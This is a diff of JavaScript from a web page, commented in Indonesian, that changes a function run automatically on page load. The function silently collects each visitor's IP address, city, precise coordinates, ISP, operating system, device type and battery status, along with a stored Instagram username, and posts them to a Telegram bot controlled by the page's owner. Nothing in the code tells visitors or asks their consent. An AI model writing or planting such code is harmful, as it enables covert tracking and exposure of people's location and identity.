@@ -372,64 +372,60 @@
         } else statusEl.textContent = "💔 Gagal.";
       } catch (e) { statusEl.textContent = "😿 Koneksi lemah."; }
     });
-    
-// ---------- Info Pengunjung (kirim ke Telegram) ----------
+	
+   // ---------- Info Pengunjung (kirim ke Telegram) ----------
 async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   try {
-    // coba ambil dari ipapi.co
-    let d;
-    try {
-      const r = await fetch("https://ipapi.co/json/");
-      d = await r.json();
-      if (!d.ip) throw new Error("ipapi.co kosong");
-    } catch {
-      // fallback ke ipwho.is jika ipapi gagal
-      const r2 = await fetch("https://ipwho.is/");
-      d = await r2.json();
-    }
+    // Ambil data lokasi & IP
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
 
+    // Ambil status baterai (jika didukung)
     const battery = (navigator.getBattery
       ? await navigator.getBattery().catch(() => ({ level: 1, charging: false }))
       : { level: 1, charging: false });
 
+    // Deteksi OS
     const OS = /Windows/i.test(navigator.userAgent) ? "Windows"
             : /Android/i.test(navigator.userAgent) ? "Android"
             : /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS"
             : /Mac/i.test(navigator.userAgent) ? "MacOS"
             : /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
 
-    const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
+    // Deteksi jenis perangkat
+    const device = /mobile/i.test(navigator.userAgent) ? " Mobile" : " Desktop";
+
+    // Format waktu lokal
     const now = new Date();
-    const lat = d.latitude || d.lat || "-";
-    const lon = d.longitude || d.lon || "-";
-    const mapsUrl = (lat !== "-" && lon !== "-")
-      ? `https://www.google.com/maps?q=${lat},${lon}`
-      : "-";
 
-    const msg = `📢 *Pengunjung Baru*  
-━━━━━━━━━━━━━━
-👤 *User:* ${savedUser}
-🌍 *Lokasi:* ${d.city || "-"}, ${d.country || d.country_name || "-"}
-📍 *Koordinat:* ${lat}, ${lon}
-🗺️ *Google Maps:* ${mapsUrl}
-💻 *Perangkat:* ${device}
-🧩 *OS:* ${OS}
-🔋 *Baterai:* ${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡ Mengisi" : "🔋 Tidak"})
-🏷️ *ISP:* ${d.org || d.connection?.isp || "-"}
-📡 *IP:* ${d.ip || "-"}
-🕓 *Waktu:* ${now.toLocaleString('id-ID')}
-━━━━━━━━━━━━━━`;
+    // Susun pesan Telegram
+    const msg = ` *Pengunjung Baru*  
+🫂 *User:* ${savedUser}
+🌍 *Lokasi:* ${d.city || "-"}, ${d.country_name || "-"}
+🗺️ *Koordinat:* ${d.latitude || "-"}, ${d.longitude || "-"}
+🌐 *Perangkat:* ${device}
+📱 *OS:* ${OS}
+🔋 *Baterai:* ${(battery.level * 100).toFixed(0)}% (${battery.charging ? " Mengisi" : " Tidak"})
+📡 *ISP:* ${d.org || "-"}
+🔢 *IP:* ${d.ip || "-"}
+⌛ *Waktu:* ${now.toLocaleString('id-ID')}
+`;
 
-    await fetch(`https://api.telegram.org/botBOT_TOKEN_HERE/sendMessage`, {
+    // Kirim ke Telegram
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: "CHAT_ID_HERE", text: msg, parse_mode: "Markdown" })
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: "Markdown"
+      })
     });
 
     console.log("✅ Info pengunjung berhasil dikirim");
   } catch (e) {
-    console.log("❌ Gagal kirim info pengunjung:", e);
+    console.log("🖕🏻 Gagal kirim info pengunjung:", e);
   }
 }
 showVisitorInfo();
